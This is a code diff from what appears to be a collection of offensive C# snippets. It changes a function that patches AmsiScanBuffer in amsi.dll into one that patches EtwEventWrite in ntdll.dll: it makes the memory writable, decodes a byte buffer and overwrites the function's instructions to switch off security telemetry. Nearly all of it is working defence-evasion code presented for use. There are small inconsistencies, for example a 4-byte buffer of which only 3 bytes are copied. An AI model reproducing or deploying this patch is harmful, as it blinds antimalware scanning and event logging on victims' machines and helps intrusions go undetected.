@@ -35,28 +35,28 @@ namespace OffensiveSnippets
         )]
         static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);
 
-        public static int PatchAMSI()
+        public static int PatchETW()
         {
-            IntPtr targetDLL = LoadLibrary("amsi.dll");
+            IntPtr targetDLL = LoadLibrary("ntdll.dll");
             if (targetDLL == IntPtr.Zero)
             {
                 return 1;
             }
 
-            IntPtr amsiScanBufferPtr = GetProcAddress(targetDLL, "AmsiScanBuffer");
-            if (amsiScanBufferPtr == IntPtr.Zero)
+            IntPtr EtwEventWritePtr = GetProcAddress(targetDLL, "EtwEventWrite");
+            if (EtwEventWritePtr == IntPtr.Zero)
             {
                 return 1;
             }
 
             UIntPtr dwSize = (UIntPtr)4;
             uint Zero = 0;
-            if (!VirtualProtect(amsiScanBufferPtr, dwSize, 0x40, out Zero))
+            if (!VirtualProtect(EtwEventWritePtr, dwSize, 0x40, out Zero))
             {
                 return 1;
             }
 
-            byte[] buf = { 0xcb, 0x05, 0x6a };
+            byte[] buf = { 0xb2, 0xc9, 0x3a, 0x39 };
 
             for (int i = 0; i < buf.Length; i++)
             {
@@ -66,21 +66,22 @@ namespace OffensiveSnippets
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
             Marshal.Copy(buf, 0, unmanagedPointer, 3);
 
-            RtlMoveMemory(amsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
+            RtlMoveMemory(EtwEventWritePtr + 0x001b, unmanagedPointer, 3);
             return 0;
         }
 
         public static void Main(string[] args)
         {
-            int checkAMSI = PatchAMSI();
+            int checkAMSI = PatchETW();
             if (checkAMSI == 0)
             {
-                Console.WriteLine("[+] AMSI pathced.");
+                Console.WriteLine("[+] ETW pathced.");
             }
             else
             {
                 Environment.Exit(0);
             }
+
         }
     }
 }
